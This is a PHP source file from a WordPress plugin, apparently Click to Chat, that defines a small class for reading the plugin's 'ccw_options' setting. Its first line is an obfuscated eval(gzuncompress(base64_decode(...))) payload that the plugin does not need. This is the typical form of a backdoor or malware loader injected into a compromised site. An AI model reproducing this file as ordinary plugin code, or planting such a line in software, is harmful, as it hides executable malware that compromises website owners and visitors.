<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Varibales to use among plugin - try to avoid globals .. 
 * replaced variables.php 
 * 
 * @method get_option retuns options table 'ccw_options' values
 * 
 * use like .. 
 * 
 * ht_ccw()->variables->get_option['enable'];
 * or
 * $values = ht_ccw()->variables->get_option;
 *      $values["enable"];
 *      $values["number"];
 * 
 */


if ( ! defined( 'ABSPATH' ) ) exit;

if ( ! class_exists( 'HT_CCW_Variables' ) ) :

class HT_CCW_Variables {

    /**
     * db options table - ccw_options values
     * 
     * @var array get_options ccw_options
     * 
     * 
   
     */
    public $get_option;


    public function __construct() {
        $this->get_option();
    }

    public function get_option() {
        $this->get_option =  get_option('ccw_options');
    }

    // public function ccw_enable() {
    //     $ccw_enable = esc_attr( $this->get_option['enable'] );
    //     return $ccw_enable;
    // }



}

endif; // END class_exists check
